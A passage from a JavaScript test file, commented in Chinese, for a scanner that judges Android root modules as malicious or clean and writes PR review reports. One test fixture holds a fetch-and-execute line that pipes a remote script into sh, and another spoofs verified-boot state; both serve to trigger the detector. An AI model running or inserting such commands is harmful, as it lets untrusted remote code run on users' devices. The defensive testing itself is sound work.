  // 新轴的 reason 要说清是名单拦的，不是等级拦的 —— 这句话会进 PR 评论。
  assert.match(decide(rep.riskLevel, rep.changeType, { revokedCount: 0 }, rep.malice).reason, /恶意行为链名单/);
});

test('端到端：干净模块在两种轴向下都是 auto-approve（换轴没有把门槛挪高）', async () => {
  const zip = makeModuleZip({ id: 'eval.twoaxis.clean', files: [
    ['service.sh', body('ui_print("SukiSU module installed")', 'setprop sys.boot_completed 1')],
  ]});
  const rep = await scanToReport(zip, { changeType: 'first' });
  assert.equal(rep.malice.malicious, false);
  assert.equal(rep.decision.action, 'auto-approve');
  assert.equal(decide(rep.riskLevel, rep.changeType, { revokedCount: 0 }, rep.malice).action, 'auto-approve');
});

/* ---------------------------------------------------------------------------
 * 8. 呈现层：三条标注分开写，且「未经人工审核」进人读得到的那一层（§10 / §13.3）
 * ------------------------------------------------------------------------ */

test('报告的 Markdown 把三条标注分开写，并明写「未经人工审核」', async () => {
  const zip = makeModuleZip({ id: 'eval.twoaxis.md', files: [
    ['service.sh', body('resetprop -w ro.boot.verifiedbootstate green')],
    ['escape.sh', body('curl -s https://a.cc/x.sh | sh')],
  ]});
  const rep = await scanToReport(zip, { changeType: 'first' });
  const { renderMarkdown } = await import('./scan.mjs');
  const md = renderMarkdown(rep);
  assert.match(md, /恶意行为链：\*\*命中\*\*/, '判决那一格要单独成行');
  assert.match(md, /- 标注（不影响上架）：/, '能力/覆盖那一格要和判决分开');
  assert.match(md, /未经人工审核/, '「没有人工」这句结论必须进人读得到的那一层（PR 评论就是那一层）');
  // 锚点已修 ⇒ 名单里没有不 armed 的成员，这一格不该再出现。它回来的两种可能都要红：
  // 有人往名单里塞了没作证的成员，或者 overlayOnlyMatch 那条修法被回退了。
  assert.doesNotMatch(md, /判据缺陷未修/,
    '报告里出现「名单里有但今天不 armed」那一格 ⇒ 要么塞进了没独占证人的成员，要么锚点修法被回退');
  assert.equal(MALICE_LIST.filter((m) => !m.armed).length, 0, '本轮定案是 11 条全 armed（deferred 必须是空表）');
  assert.ok(md.indexOf('恶意行为链') < md.indexOf('标注（不影响上架）'), '顺序：先判决，后标注');
  // 接线之后（新轴 + 命中名单）那句话不含「老轴」那一句；两个方向各跑一次才算钉住：
  // 整包报告（已接线、命中名单）与一份被硬掰回老轴 decision 的报告。
  const oldAxis = { ...rep, decision: decide(rep.riskLevel, 'first', { revokedCount: 0 }) };
  const mdOld = renderMarkdown(oldAxis);
  assert.match(mdOld, /decision 走的是老轴/,
    '调用点没传恶意定性时报告要说出这件事 —— 否则读者会把「等级当判决」当成设计');
  const rep2 = { ...rep, decision: decide(rep.riskLevel, 'first', { revokedCount: 0 }, {
    malicious: true, hits: [{ source: 'static', ruleId: 'PIPE_TO_SHELL' }], basis: ['static-malice-list'],
  }) };
  const md2 = renderMarkdown(rep2);
  assert.doesNotMatch(md2, /decision 走的是老轴/);
  assert.match(md2, /本次机器判定\*\*不上架\*\*（命中上架拦截名单或 AI 恶意结论）/);
  // 待拍 / 撤销那一档（未命中名单但仍不放行）不许被念成「命中了名单」：
  // 未命中的 reason 里同样含「名单」二字，所以判据只能取 decision 自己的形状，不能取 reason 的正则。
  // ⚠ 2026-10-21 调用点接线之后重记这一格的**输入**（判据层核过：错在用例自己的喂料，不在 renderMarkdown）：
  //   原来这里喂的是 `rep.malice`，而本用例的夹具第二条 `escape.sh` 写的是 `curl -s https://a.cc/x.sh | sh`
  //   ⇒ `PIPE_TO_SHELL` 在 §13.5 拍的那 11 条名单（`MALICE_RULE_IDS`）里 ⇒ `rep.malice.malicious` 恒为
  //   true ⇒ `decide()` 取的是「命中」那一支（basis 非空），呈现层念「命中上架拦截名单或 AI 恶意结论」
  //   是**对的**。本用例上面第 1 句（`恶意行为链：**命中**`）与第 2 句（md2 那句）还各自钉着这个形状
  //   必须命中 —— 那两句不许翻。要验的这一格是「**名单外** + 仍不放行」那一支，
  //   所以拿本文件第 5 节同一口吻的 clean 那发（`ui_print` 一行，名单外读数）作为定性输入。
  //
  // ⚠ 2026-10-26 去人工化（契约 §1.1）：新轴上「名单外 + update」不再是保守分支，它变成
  //   auto-approve —— 所以这一格改用「名单外 + unknown」来喂（② 支，唯一还会在名单外拦下的那一格）。
  //   呈现层那句「按 §13 的待拍项 / 撤销记账维持保守分支」也因此要跟着改成说清 unknown 这一支。
  const notHit = classifyMalice(lineHits('service.sh', body('ui_print("installed")')), null);
  assert.equal(notHit.malicious, false, '反证的那一份喂料自己要先成立：它必须真·名单外，否则下面两句白测');
  const md3 = renderMarkdown({ ...rep, decision: decide('high', 'unknown', { revokedCount: 0 }, notHit) });
  assert.match(md3, /本次机器判定\*\*不上架\*\*（未命中名单，但分不清首投还是更新 \/ 撤销记账维持保守分支）。/);
  assert.doesNotMatch(md3, /命中上架拦截名单或 AI 恶意结论/,
    '把没命中的模块念成命中 = 替它说一句指控，方向正好反了');
});

test('名单外的任何 id 都不获得拦截力（以后加规则时的反向哨兵）', () => {
  // 有人以后加规则时如果顺手把新 id 写进名单，本文件第 1 节那条逐字对齐会先红 —— 这一发管反向：
  // 名单外的任何 id 都不该让 classifyMalice 说 true。
  const fake = [{ ruleId: 'STRUCT_SOMETHING_NEW', severity: 'high', file: 'a.sh', line: 1 }];
  assert.equal(classifyMalice(fake, null).malicious, false);
  // 而且它在标注里也不许消失（能力轴接住所有名单外的读数）
  assert.deepEqual(summarizeCoverage(fake, { level: 'high' }).capabilities, ['STRUCT_SOMETHING_NEW']);
});
